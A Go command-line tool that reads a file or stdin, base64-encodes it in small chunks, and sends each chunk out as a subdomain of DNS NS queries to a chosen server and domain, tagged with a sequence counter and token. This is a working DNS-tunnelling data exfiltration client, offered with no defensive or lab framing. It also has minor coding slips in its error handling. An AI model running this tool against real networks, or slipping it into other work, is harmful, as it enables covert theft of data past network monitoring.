package main

import (
	"bufio"
	"encoding/base64"
	"flag"
	"fmt"
	"io"
	"log"
	"os"

	"github.com/miekg/dns"
)

const (
	SubDomainSizeLimit   = 63
	TotalDomainSizeLimit = 253
)

var (
	server        = flag.String("server", "", "The server where to send the \"lookups\"")
	serverPort    = flag.String("port", "53", "Server port")
	target        = flag.String("target", "", "The top part of the domain, payload will be sub-domain of this")
	verbose       = flag.Bool("v", false, "Enable verbose logging")
	fileSource    = flag.String("file", "", "Read data from file instead of default stdin")
	dataChunkSize = flag.Int("size", 47, "Data chunk size in bytes")
	token         = flag.String("token", "o", "Token for identification on server side")
)

func parseFlags() {
	flag.Parse()

	if *server == "" {
		log.Fatal("missing server (--server)")
	}
	if *target == "" {
		log.Fatal("missing target domain (--target)")
	}
}

func getDataSource() (io.Reader, error) {
	source := os.Stdin

	if *fileSource != "" {
		fp, err := os.Open(*fileSource)
		if err != nil {
			return nil, fmt.Errorf("failed to open file %s, %w", *fileSource, err.Error())
		}

		source = fp
	}

	return source, nil
}

func sendData(data []byte, count int) error {
	var (
		msg    dns.Msg
		client dns.Client
	)

	encodedData := base64.RawStdEncoding.EncodeToString(data)
	question := fmt.Sprintf("%s.%d.%s.%s.", encodedData, count, *token, *target)

	if len(question) > TotalDomainSizeLimit || len(encodedData) > SubDomainSizeLimit {
		return fmt.Errorf("subdomain validates limits (%d >? %d, %d >? %d)",
			len(encodedData), SubDomainSizeLimit, len(question), TotalDomainSizeLimit)
	}

	msg.SetQuestion(question, dns.TypeNS)

	if *verbose {
		log.Printf("sending %8d %s\n", count, question)
	}

	_, _, err := client.Exchange(&msg, *server+":"+*serverPort)
	if err != nil {
		return fmt.Errorf("failed exchange, %w", err)
	}

	return nil
}

func main() {
	parseFlags()

	source, err := getDataSource()
	if err != nil {
		log.Fatal(err)
	}

	var buffer [512]byte

	scanner := bufio.NewReader(source)
	counter := 0
	size := *dataChunkSize

	for {
		read, err := scanner.Read(buffer[:size])
		if read == 0 {
			break
		}
		if err != nil {
			log.Fatalf("failed read, %s", err.Error())
		}

		if err := sendData(buffer[:read], counter); err != nil {
			log.Fatalf("failed sending data, %s", err.Error())
		}
		counter++
	}

	if *verbose {
		log.Println("done")
	}
}
